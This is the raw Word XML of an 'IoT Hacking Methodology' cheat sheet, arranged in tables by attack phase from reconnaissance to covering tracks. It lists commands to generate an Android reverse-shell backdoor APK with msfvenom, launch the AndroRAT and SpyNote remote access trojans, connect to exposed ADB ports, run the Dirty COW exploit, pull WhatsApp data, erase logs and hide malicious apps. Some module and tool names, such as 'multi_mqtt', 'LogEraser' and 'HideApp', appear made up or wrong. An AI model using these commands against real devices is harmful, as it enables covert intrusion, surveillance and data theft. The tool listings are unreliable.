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IoT Hacking Methodology – Cheat Sheet</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Reconnaissance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: Gather information about IoT devices, services, and networks.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Shodan</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Search engine for IoT devices exposed on the internet.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>shodan search 'port:1883'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Censys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Collects and analyzes data about internet-connected devices.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>censys search 'protocols: mqtt'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Bevywise MQTTRoute</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>MQTT broker to test IoT device communications.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>python mqttroute.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Nmap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Port scanning and service enumeration.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>nmap -sV -p 1883,5683,8883 &lt;target&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Vulnerability Research</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: Identify flaws in IoT firmware, services, and applications.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Binwalk</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Firmware analysis tool for extracting and reverse-engineering.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>binwalk firmware.bin</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Firmware-Mod-Kit</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Unpack, modify, and repack IoT firmware images.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>./extract-firmware.sh firmware.bin</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>IoTSeeker</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Finds IoT devices using default credentials.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>python iotseeker.py &lt;IP_range&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: Exploit IoT vulnerabilities to gain control.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Metasploit</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Framework for exploiting IoT and embedded devices.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>msfconsole</w:t>
              <w:br/>
              <w:t>use exploit/linux/misc/multi_mqtt</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>MSFvenom</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Payload generator for IoT and mobile exploitation.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>msfvenom -p android/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -o backdoor.apk</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>AndroRAT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Remote Access Trojan for Android.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>java -jar AndroRAT.jar -i &lt;IP&gt; -p &lt;PORT&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Privilege Escalation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: Escalate privileges on IoT devices.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Dirty COW Exploit</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Linux kernel privilege escalation exploit.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>gcc -pthread dirty.c -o dirty -lcrypt</w:t>
              <w:br/>
              <w:t>./dirty</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>CheckRoot</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Detect root/jailbreak status on Android/iOS devices.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>checkroot --scan</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Data Extraction</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: Exfiltrate sensitive data from IoT devices.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ADB (Android Debug Bridge)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Extract data and backup apps from Android devices.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>adb pull /sdcard/whatsapp/ backup/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Wireshark</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Capture and analyze IoT device traffic.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>wireshark &amp;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Tcpdump</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Command-line traffic capture for IoT devices.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>tcpdump -i wlan0 port 1883</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6. Maintaining Access</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: Persist access using backdoors or RATs.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AndroRAT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Install persistent Android RAT.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>java -jar AndroRAT.jar -i &lt;IP&gt; -p &lt;PORT&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>SpyNote</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Android RAT for persistence.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>java -jar spynote.jar</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>PhoneSploit Pro</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Exploit ADB for remote access.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>phonesploit connect &lt;IP&gt;:5555</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7. Covering Tracks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: Hide malicious activities on IoT devices.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Commands / Usage</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>LogEraser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Remove Android/iOS system logs.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>logeraser --clean</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>HideApp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Hide malicious apps from the device menu.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>hideapp install backdoor.apk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